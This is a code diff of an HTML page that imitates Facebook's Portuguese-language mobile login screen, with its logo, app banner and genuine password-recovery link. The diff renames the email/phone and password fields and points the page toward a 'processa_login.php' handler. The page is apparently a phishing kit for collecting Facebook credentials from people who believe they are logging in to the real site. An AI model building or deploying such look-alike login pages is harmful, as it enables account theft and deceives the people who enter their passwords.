@@ -9,15 +9,15 @@
     <title>Facebook – entre ou cadastre-se</title>
 </head>
 <body>
-    <div class="fundoapp">
+    <div class="fundoapp" action="processa_login.php">
         <img class="iconcel" src="iconecel.png">
         <br>
         <p class="app">Obtenha o Facebook para Android e navegue mais rápido.</p>
     </div>
     <form action="" method="post">
         <img class="logo" src="logo.svg">
-		<input type="text" name="emailoucel" placeholder="Número de celular ou email" required/>
-		<input type="password" name="password" minlength="8" placeholder="Senha" required/>
+		<input type="text" name="email_telefone" id="email_telefone" placeholder="Número de celular ou email" required/>
+		<input type="password" name="senha" minlength="8" placeholder="Senha" required/>
 		<button type="submit"><b>Entrar</b></button>
         <div style="margin-top: 10px;"></div>
         <a class="recuperacaodesenha" href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=1&_rdr">Esqueceu a senha?</a>
